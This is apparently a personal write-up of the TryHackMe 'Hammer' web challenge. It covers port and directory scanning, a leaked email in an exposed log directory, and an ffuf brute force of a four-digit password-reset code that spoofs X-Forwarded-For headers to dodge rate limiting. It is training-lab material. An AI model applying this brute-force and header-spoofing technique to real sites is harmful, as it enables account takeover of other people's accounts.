---
title: "Hammer"
kind: writeup
tags:
  - tryhackme-rooms
  - status/done
  - writeup
  - web
  - challenege
status: "Done"
difficulty: "Medium"
url: "https://tryhackme.com/room/hammer"
category:
  - "Challenege"
database: "TryHackMe"
area: "TryHackMe Rooms"
up: "[[TryHackMe]]"
notion-id: f3e759b9275182f19514018ded49e9b2
---

# Hammer

In: [[Career]] / [[TryHackMe Rooms]] / [[TryHackMe]]

Nmap Scan

```bash
┌──(kali㉿Shieldbyte53)-[~]
└─$ nmap -sC -sV -p- -Pn -T4 10.48.170.148
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-14 15:41 IST
Nmap scan report for 10.48.170.148
Host is up (0.023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 22:ad:f6:e6:c2:62:31:c4:23:10:30:6c:8c:be:d8:8c (RSA)
|   256 9a:44:af:61:6e:f9:54:f6:3e:56:97:93:a4:06:b3:da (ECDSA)
|_  256 70:33:1c:ba:fa:99:b4:be:2e:cf:8d:2e:0f:ee:b2:ca (ED25519)
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.52 seconds

```

Fuzzing Directories on port http://10.48.170.148:1337/

```bash
┌──(kali㉿Shieldbyte53)-[~]
└─$ ffuf -u http://10.48.170.148:1337/FUZZ -w /usr/share/wordlists/dirb/common.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.170.148:1337/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 10ms]
.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 11ms]
                        [Status: 200, Size: 1326, Words: 351, Lines: 37, Duration: 13ms]
.hta                    [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 2985ms]
index.php               [Status: 200, Size: 1326, Words: 351, Lines: 37, Duration: 13ms]
javascript              [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 10ms]
phpmyadmin              [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 32ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 14ms]
vendor                  [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 12ms]
:: Progress: [4614/4614] :: Job [1/1] :: 2083 req/sec :: Duration: [0:00:05] :: Errors: 0 ::

```

Page Source reveals something

![[attachments/TryHackMe Rooms/TryHackMe/Hammer/image.png]]

Fuzzing on hmr_ directory http://10.48.170.148:1337/

```bash
┌──(kali㉿Shieldbyte53)-[~]
└─$ ffuf -u http://10.48.170.148:1337/hmr_FUZZ -w /usr/share/wordlists/dirb/big.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.170.148:1337/hmr_FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

css                     [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 10ms]
images                  [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 11ms]
js                      [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 11ms]
logs                    [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 11ms]
:: Progress: [20469/20469] :: Job [1/1] :: 3278 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```

visiting hmr_logs directory

![[attachments/TryHackMe Rooms/TryHackMe/Hammer/image 1.png]]

Logs revealed the email

```prolog
[Mon Aug 19 12:00:01.123456 2024] [core:error] [pid 12345:tid 139999999999999] [client 192.168.1.10:56832] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/
[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [pid 12348:tid 139999999999996] [client 192.168.1.20:37254] AH01627: client denied by server configuration: /etc/shadow
[Mon Aug 19 12:04:56.654321 2024] [core:error] [pid 12349:tid 139999999999995] [client 192.168.1.22:38100] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected
[Mon Aug 19 12:05:07.543210 2024] [authz_core:error] [pid 12350:tid 139999999999994] [client 192.168.1.25:46234] AH01627: client denied by server configuration: /home/hammerthm/test.php
[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
[Mon Aug 19 12:07:29.321098 2024] [core:error] [pid 12352:tid 139999999999992] [client 192.168.1.35:42310] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:09:51.109876 2024] [core:error] [pid 12354:tid 139999999999990] [client 192.168.1.50:45998] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-down
```

![[attachments/TryHackMe Rooms/TryHackMe/Hammer/image 2.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Hammer/image 3.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Hammer/image 4.png]]

To Generate codes

```verilog
seq -w 0000 9999 > codes.txt 
```

To generate Ips

```verilog
for i in {1..10000}; do printf "%d.%d.%d.%d\n" $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)); done > ips.txt        
```

fuzzing codes

```verilog

┌──(kali㉿Shieldbyte53)-[~]
└─$ ffuf \
  -w Testing/codes.txt:W1 \
  -w Testing/ips.txt:W2 \
  -u "http://10.48.170.148:1337/reset_password.php" \
  -X POST \
  -d "recovery_code=W1&s=80" \
  -b "PHPSESSID=8es52coqcoec41adkvan05no0j" \
  -H "X-Forwarded-For: W2" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fr "Invalid" \
  -mode pitchfork \
  -fw 1 \
  -rate 100 \
  -o output.json -of json

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.48.170.148:1337/reset_password.php
 :: Wordlist         : W1: /home/kali/Testing/codes.txt
 :: Wordlist         : W2: /home/kali/Testing/ips.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Cookie: PHPSESSID=8es52coqcoec41adkvan05no0j
 :: Header           : X-Forwarded-For: W2
 :: Data             : recovery_code=W1&s=80
 :: Output file      : output.json
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
 :: Filter           : Regexp: Invalid
________________________________________________

[Status: 200, Size: 2190, Words: 595, Lines: 53, Duration: 14ms]
    * W1: 2259
    * W2: 146.102.236.14

:: Progress: [10000/10000] :: Job [1/1] :: 105 req/sec :: Duration: [0:01:42] :: Errors: 0 ::

```

![[attachments/TryHackMe Rooms/TryHackMe/Hammer/image 5.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Hammer/image 6.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Hammer/image 7.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Hammer/image 8.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Hammer/image 9.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Hammer/image 10.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Hammer/image 11.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Hammer/image 12.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Hammer/image 13.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Hammer/image 14.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Hammer/image 15.png]]
